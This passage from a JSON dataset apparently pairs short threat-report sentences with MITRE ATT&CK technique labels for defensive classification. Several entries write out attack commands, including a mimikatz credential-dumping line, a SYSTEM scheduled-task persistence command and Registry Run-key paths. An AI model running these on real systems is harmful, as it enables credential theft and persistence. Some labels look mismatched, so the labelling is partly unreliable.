    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru SYSTEM /tn update /tr cmd /c c:\\windows\\temp\\update.bat /sc once /f /st and to maintain persistence.(Citation: Cycraft Chimera April 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creating aservice called InstallSvc",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "gathers the current domain the victim system belongs to.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to upload collected files to C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Self-delete after sending data",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The  malware communicates to its command server using HTTP with an encrypted payload.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The DLL is used to create a malicious service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "wmic product get name,version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "where they were previously injected into",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads.(Citation: Cyberreason Anchor December 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gathers information about network adapters using the Win32 API call GetAdaptersInfo.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry Run keys to establish automatic execution at system startup.(Citation: TrendMicro PE_URSNIF.A2)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the domain name from a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download next stage malware components to a compromised system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "shows that this connection was likely HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to gather information about the system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The names of the registry values changed",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "used a backdoor QUICKRIDE to communicate to the C2 server over HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware has used CreateProcess to launch additional malicious components.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can be set via the command-line as well.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used scripts to delete itself after execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files it has created on a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a command to create a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with C2 over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has deleted its files and components from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has injected its DLL component into `EhStorAurhn.exe`.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use the Windows API functions `GetProcAddress` `LoadLibrary` and `CreateProcess` to execute another process.(Citation: Lastline PlugX Analysis)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "remote process the payload gets injected to.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses WMI to help propagate itself across a network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "func_GetUserName()",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can gather the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "searches for files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "then a malware downloader is uploaded to the device",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Delete file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows API calls to obtain information about the compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "registers two scheduled tasks:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then executed Mimikatz on VDI-KMS to harvest credentials",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used backdoors that can delete files used in an attack from an infected system.(Citation: ESET Telebots Dec 2016)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "executed  by using rundll32 commands such as rundll32.exe C:\\Windows\\twain_64.dll.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.(Citation: Crowdstrike DNC June 2016)(Citation: Bitdefender APT28 Dec 2015)(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit 42 Playbook Dec 2017)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "is capable of performing directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate and query for information contained within the Windows Registry.(Citation: Lastline PlugX Analysis)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "collects the current username from the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can brute force a local admin password then use it to facilitate lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate logical drives on a target system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used a VBA script to execute WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Disables MAPS (Microsoft Active Protection Service) reporting",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete folders and files from a targeted system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through malicious files attached to e-mails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "gathers the victim's computer name Windows version and system language and then sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to deploy modules directly from command and control (C2) servers possibly for remote command execution file exfiltration and socks5 proxying on the infected host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has gained execution through user interaction with a malicious file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can capture information regarding the victim's OS security and hardware configuration.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates an entry in a Registry Run key for the malware to execute on startup.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading a file from a specified URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has stored a decoy PDF file within a victim's `%temp%` folder.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversary launched backdoor and some tools as a Windows Service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "attackers was to establish a Remote Desktop session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the ifconfig -a command. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collected data from local victim systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "collects information about the OS and computer name.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors again used Get-System to elevate and then dumped LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used  to harvest credentials from the victim's machine.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "it searches the drives of compromised systems for interesting files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM.(Citation: ESET Gamaredon June 2020)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "retrieves a decoy tax document and VBS script.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject into the `svchost.exe` process for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The batch file eyewear.bat then executed two commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collects data from the local victim system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has a dynamic debugging feature to check whether it is located in the %TEMP% directory otherwise it copies itself there.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can spawn a job to inject into LSASS memory and dump password hashes.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used valid accounts including administrator accounts to help facilitate lateral movement on compromised networks.(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "prompting the user to open the HTML attachment",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to clean up installed files delete files and delete itself from the victims machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use the command line to control execution on compromised hosts.(Citation: Sogeti CERT ESEC Babuk March 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover the username on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the first lateral movement from the beachhead to the server using RDP with an Administrator account:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has collected the PID of a malicious process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list drives and obtain the computer name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "valid credentials have been used by Vice Society to gain initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has disabled antivirus services on targeted systems in order to upload malicious payloads.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the initialized file downloads multiple malicious payloads from remote servers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can upload files to the victim's machine for operations.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used an HTTP malware variant and a Port 22 malware variant to collect the victims username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` to run commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "taking command line arguments",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain file and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The process list checked is as follows",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional files.(Citation: MSTIC NOBELIUM Mar 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP in C2 communications.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "and process injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "deletes the ransom note",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "collects contacts and application data from files in Desktop Documents Downloads Dropbox and WeChat folders.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use net config workstation arp -a and ipconfig /all to gather network configuration information.(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the malware creates 2 scheduled tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can patch Antimalware Scan Interface (AMSI) Windows Lockdown Policy (WLDP) as well as exit-related  functions to avoid process termination.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It sets up a run key for via the command C:\\ProgramData\\GoogleUpdate\\googleupdate.exe work for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "lists files on the victims machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC for lateral movement as well as during and post compromise cleanup activities.(Citation: FireEye Obfuscation June 2017)(Citation: Bitdefender FIN8 July 2021)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files and directories.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "its C2 server every five\nseconds via HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "a fake message to lure users to execute the HTA  file ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has modified the Registry to perform multiple techniques through the use of .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can collect a list of running processes by calling CreateToolhelp32Snapshot.(Citation: Unit42 Azorult Nov 2018)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search for files. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has created a new registry entry at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of C:\\ProgramData\\Initech\\Initech.exe /run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute payloads in-memory or from disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A version of  searches for filenames created with a previous version of the malware suggesting different versions targeted the same victims and the versions may work together.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A dropper used by  installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "variants can add malicious DLL modules as new services. can also delete services from the victims machine.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used multiple native APIs including ShellExecuteW to run executablesGetWindowsDirectoryW to create folders and VirtualAlloc WriteProcessMemory and CreateRemoteThread for process injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts to enumerate network information including information about trusts zones and the domain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the hostname of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can store its configuration in the Registry at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has added persistence via the Registry key software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can list contents of drives and search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by adding a Scheduled Task named Microsoft Boost Kernel Optimization.(Citation: ClearSky Wilted Tulip July 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to execute malicious code.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "dumped lsass memory on the domain controller.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that looks for files and directories on the local file system.(Citation: FireEye Clandestine Fox)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": " WinExec() ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can collect directory and file lists.(Citation: Eset Ramsay May 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Local IP address and port used to send the network packet",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can check for Internet connectivity by contacting bing[.]com with the request format `bing[.]com?id=<GetTickCount>`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "is created using the same API call;",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim username along with other account information (account type description full name SID and status).",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands using `cmd.exe`.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "which downloaded obfuscated PowerShell and executed it in memory:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "to get files from drives",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use the schtasks utility to bypass UAC.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "by calling the GetNetworkParams API function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to install a scheduled task named Java Maintenance64 on startup to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can manipulate Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can delete its persistence mechanisms from the registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands from its C2 server.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `wmic` and `rundll32` to load  onto a target host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can browse file systems using a file manager module.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "contains a variety of enumeration modules that have an option to use API calls to carry out tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather user information from the targeted system using `whoami/upn&whoami/fqdn&whoami/logonid&whoami/all`.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "data can be collected locally by the corresponding class before it is staged for exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "dumps memory from specific processes on a victim system parses the dumped files and scrapes them for credit card data.(Citation: Kroll RawPOS Jan 2017)(Citation: TrendMicro RawPOS April 2015)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "this includes VPN accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can use Registry Run Keys for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=0 and HKEY_CURRENT_USER\\Software\\DC3_FEXEC.(Citation: TrendMicro DarkComet Sept 2014)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can store collected data locally in a created .nfo file.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify processes via C# methods such as GetProcessesByName and running  with the Python os.popen function.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled SYSTEM task that runs when a user logs in.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create a new process using `rundll32`.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A  variant can communicate with its C2 servers by using HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uploads files via unencrypted HTTP. (Citation: wardle evilquest partii)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has deleted artifacts including scheduled tasks communicates files from the C2 and other logs.(Citation: Cyber Forensicator Silence Jan 2019)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "is capable of enumerating the running processes on the system using pslist.(Citation: Unit 42 Tropic Trooper Nov 2016)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the current Windows domain of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims to execute malware with spearphishing attachments containing macros to download either  Bokbot  or .(Citation: CrowdStrike Grim Spider May 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used a malicious DLL to search for files with specific keywords.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has searched for specific files prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can delete files from victim machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "gathers the local IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "miner has created UPX-packed files in the Windows Start Menu Folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to respawn itself using ShellExecuteW and CreateProcessW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "variants have communicated with C2 servers over HTTP and HTTPS.(Citation: ESET Sednit Part 1)(Citation: Unit 42 Sofacy Feb 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "using the FindFirstFileW() and FindNextFileW() API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "New-UserPersistenceOption Persistence argument can be used to establish via a .(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\System32\\rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can delete .LNK files created in the Startup folder.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to create set copy or delete a specified Registry key or value.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can obtain system information such as OS version and disk space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ransomware uses Native API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download a DLL from C2 to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can read batch commands in a file sent from its C2 server and execute them with cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can write an encrypted token to the Registry to enable processing of remote commands.",
    "command": "",
